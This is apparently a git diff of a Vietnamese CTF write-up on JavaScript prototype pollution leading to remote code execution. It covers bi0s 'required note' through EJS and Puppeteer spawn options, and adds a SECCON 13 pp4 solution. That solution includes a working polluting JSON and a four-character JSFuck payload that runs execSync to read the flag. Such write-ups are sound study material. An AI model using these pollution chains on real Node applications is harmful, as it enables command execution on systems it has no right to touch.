@@ -5,7 +5,7 @@ tags:
  - Prototype-Pollution
  - RCE 
 categories:
- - CTF
+ - Research
 ---
 
 ## Object trong JavaScript
@@ -57,7 +57,8 @@ function merge(src, dst) {
 }
 ```
 
-## Challenge: bi0s/required note
+## Challenge:
+### bi0s/required note
 :::info
 Every CTF requires at least one overly complicated notes app.
 
@@ -70,7 +71,7 @@ Every CTF requires at least one overly complicated notes app.
 ![alt text](assets/prototype-pollution-bios/prototype-pollution-bios-5.png)
 - Có một note chứa flag được tạo sẵn với tên được generate từ hàm `Math.random()` bao gồm 16 kí tự [a-z0-9]
 
-### Overview
+#### Overview
 Khi tùy chỉnh settings, ta sẽ gửi POST request đến server
 ![alt text](assets/prototype-pollution-bios/prototype-pollution-bios-6.png)
 Hàm sau đó được xử lí như sau
@@ -111,8 +112,8 @@ Cụ thể, POST payload lên `/customise` để truyền payload vào file `set
 ![alt text](assets/prototype-pollution-bios/prototype-pollution-bios-8.png)
 
 Như vậy thì ta có thể tận dụng Prototype Pollution để khai thác bài này.
-### Solution
-#### RCE với EJS
+#### Solution
+##### RCE với EJS
 Ejs v3.1.9 cũng có [vuln SSTI](https://github.com/mde/ejs/issues/735). Kiểm tra thử compile prototype thì thấy đa số các options đều có được `_JS_IDENTIFIER` test trước khi xử lí, trừ `escapeFn`
 ![alt text](assets/prototype-pollution-bios/prototype-pollution-bios-9.png)
 `escapeFn` lại được gán từ `opts.escapeFunction`
@@ -188,7 +189,7 @@ Trước tiên gán cho `opts.client` là truthy value. Tiếp tục gán cho `e
 Options của EJS đã được gán vào, giờ ta chỉ cần cho hàm `res.render()` chạy, file note mới với tên `flag.json` sẽ được sinh ra, view note đó và lấy flag 😙
 ![alt text](assets/prototype-pollution-bios/prototype-pollution-bios-11.png)
 
-#### RCE với Puppeteer
+##### RCE với Puppeteer
 Khi GET `/healthcheck`, server sẽ chạy bot với Puppeteer, tạo một process mới, chạy browser headless và truy cập vào trang `/view/Healthcheck`. 
 ![alt text](assets/prototype-pollution-bios/prototype-pollution-bios-12.png)
 Khi Puppeteer launch browser mới, cũng đồng thời sử dụng `child_process.spawn()` với 3 args là `detached`, `env`, `stdio`.
@@ -202,3 +203,96 @@ Server sẽ chạy lệnh như sau `/bin/sh echo hehehe -c this.#executablePath 
 
 Đầu tiên gán giá trị cho `shell` thành `/proc/self/exe`, tiếp tục gán giá trị cho `argv0` là đoạn javascript cần execute. Cuối cùng là chỉnh `NODE_OPTIONS` là `--require /proc/self/cmdline` để chạy lệnh của mình.
 Sau khi pollute các options thì GET đến `/healthcheck` để Puppeteer spawn process mới. Khi đó, command mình đưa vào sẽ được thực hiện, giờ chỉ cần mở `/view/flag` lấy flag
+
+### seccon13/pp4
+:::info
+> Author: Ark
+:::details Source
+```js
+#!/usr/local/bin/node
+const readline = require("node:readline/promises");
+const rl = readline.createInterface({
+  input: process.stdin,
+  output: process.stdout,
+});
+
+const clone = (target, result = {}) => {
+  for (const [key, value] of Object.entries(target)) {
+    if (value && typeof value == "object") {
+      if (!(key in result)) result[key] = {};
+      clone(value, result[key]);
+    } else {
+      result[key] = value;
+    }
+  }
+  return result;
+};
+
+(async () => {
+  // Step 1: Prototype Pollution
+  const json = (await rl.question("Input JSON: ")).trim();
+  console.log(clone(JSON.parse(json)));
+
+  // Step 2: JSF**k with 4 characters
+  const code = (await rl.question("Input code: ")).trim();
+  if (new Set(code).size > 4) {
+    console.log("Too many :(");
+    return;
+  }
+  console.log(eval(code));
+})().finally(() => rl.close());
+```
+:::
+
+Bài yêu cầu người dùng nhập vào một JSON để pollute prototype và sau đó eval code với 4 kí tự. JSFuck bình thường cần sử dụng đến 6 kí tự nên ta cần phải tìm cách pollute được prototype nào đó để có thể chạy code bất kì chỉ với 4 kí tự. 
+
+Chỉ nhập vào được 4 kí tự nên ta cần pollute code và sử dụng Object Function để chạy đoạn code đó.
+```js:no-line-numbers
+Function("code")()
+```
+Đoạn code trên sẽ tạo anonymous function sau đó execute function đó. Giờ ta cần chuyển qua jsfuck để có thể execute code.
+JSFuck thông thường có 6 kí tự `[]()!+`, tuy nhiên trong này chỉ được 4 kí tự. Nên ta cần chọn ra 4 kí tự có thể sử dụng được trong bài này. Trước hết ta cần `()` để có thể invoke function. Hai kí tự còn lại có thể tận dụng được để làm nhiều thứ khác là `[]`.
+
+`[]` là Array, các prototype của nó bao gồm những hàm thuộc object Function, như vậy ta cần tìm cách gọi đến một trong những prototype dưới đây để có được object Function
+![alt text](assets/prototype-pollution-bios/prototype-pollution-bios-15.png)
+Sau khi có được đến Function bất kì, ta có thể truy cập đến `constructor` của nó để gọi được object Function
+![alt text](assets/prototype-pollution-bios/prototype-pollution-bios-16.png)
+
+Vấn đề bây giờ là làm sao chỉ dựa vào 4 kí tự `[]()` để truy cập được `constructor`. `[]` là kí tự khá đặc biệt, không chỉ là Array mà còn là cách để truy cập một thuộc tính của object. Ta phải tìm cách pollute để có thể gọi đến string "constructor".
+Khi sử dụng bracket notation, tên thuộc tính trước hết sẽ được chuyển qua String. Ví dụ với object `a`, khi truy cập đến một thuộc tính không tồn tại, sẽ trả về `undefined`, convert qua String sẽ thành chuỗi `"undefined"`. 
+Như thế ta chỉ cần pollute `"undefined" = "constructor"`
+![alt text](assets/prototype-pollution-bios/prototype-pollution-bios-17.png)
+Khi chuyển sang jsfuck, ta có thể cho Array truy cập đến một property rỗng
+```js:no-line-numbers
+> [][[]] = Array[""] = undefined
+> [][[][[]]] = Array[Array[""]] = "constructor"
+```
+Như vậy, ta đã có được object Function. Bây giờ ta cần pollute để có thể lưu được đoạn code của mình vào.
+Dựa vào payload ở trên. Khi ta sử dụng `[][[]]` là đang truy cập đến một property với chuỗi rỗng, ta có thể pollute  chuỗi này để chứa execute code
+```js:no-line-numbers
+> [][[]] = Array[""] = "console.log(123)"
+```
+Lúc này, ta cần phải chỉnh lại payload phía trên một tí để có thể ra được chuỗi `"constructor"` vì `Array[""]` lúc này không còn là undefined.
+Cách sửa rất đơn giản là pollute `console.log(123)` về `"constructor"`.
+```js:no-line-numbers
+> Array[""] = "console.log(123)"
+> Array["console.log(123)"] = "constructor"
+
+> Array[Array[""]] = "constructor"
+```
+![alt text](assets/prototype-pollution-bios/prototype-pollution-bios-18.png)
+Bây giờ chỉ cần chuyển sang Jsfuck với 4 kí tự `[]()` là xong.
+
+```js
+INPUT_JSON = {
+  "constructor": {
+    "prototype": {
+      "": "import('child_process').then(a=>a.execSync).then(b=>b('cat /flag*')).then(c=>console.log(String(c)))",
+      "import('child_process').then(a=>a.execSync).then(b=>b('cat /flag*')).then(c=>console.log(String(c)))": "constructor"
+    }
+  }
+}
+INPUT_CODE = "[][[][[][[]]]][[][[][[]]]]([][[]])()"
+console.log(JSON.stringify(INPUT_JSON));
+console.log(INPUT_CODE);
+```
